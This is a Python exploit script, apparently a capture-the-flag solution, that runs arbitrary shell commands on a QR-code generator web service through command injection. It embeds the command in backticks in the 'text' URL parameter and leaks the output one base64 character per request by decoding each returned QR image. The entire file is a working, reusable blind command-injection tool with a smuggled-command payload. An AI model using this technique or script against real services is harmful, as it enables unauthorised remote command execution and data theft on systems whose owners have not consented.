#!/usr/bin/python

import requests
import sys
import time
import os
import base64

# pit3 install pillow
# pip3 install pyqrcode
# pip3 install pyzbar

from PIL import Image
from pyzbar.pyzbar import decode

target_url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text={}"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
   "Accept-Encoding": "gzip, deflate",
   "Referer": "http://challs.houseplant.riceteacatpanda.wtf:30004/",
}


def execute_command(command):
    print("cmd > {}".format(command))
    command_output = ""
    i = 1
    finished = False
    while not finished:
        payload = "`{}|base64|cut -c{}`".format(command, i)
        qr_code = http_get(payload)
        qr_code_image_name = "qr.png"
        with open(qr_code_image_name, "wb") as qr_code_image:
            qr_code_image.write(qr_code)
        qr_data = decode(Image.open(qr_code_image_name))[0].data.decode("utf-8")
        if len(qr_data.strip()) > 0:
            command_output += qr_data
        else:
            finished = True
        os.remove(qr_code_image_name)
        i += 1
    print(base64.b64decode(command_output))


def http_get(payload):
    response = None
    response_ok = False
    while not response_ok:
        try:
            target_attacked = target_url.format(payload)
            r = requests.get(target_attacked, headers=headers)
            response = r.content
            if r.status_code == 200:
                response_ok = True
                time.sleep(1)
            else:
                print("   ERROR!")
                time.sleep(10)
            if "PNG" not in r.text:
                raise Exception("PNG not found in response!")
        except:
            print("   EXCEPTION!")
            time.sleep(5 * 60)
    return response


execute_command(sys.argv[1])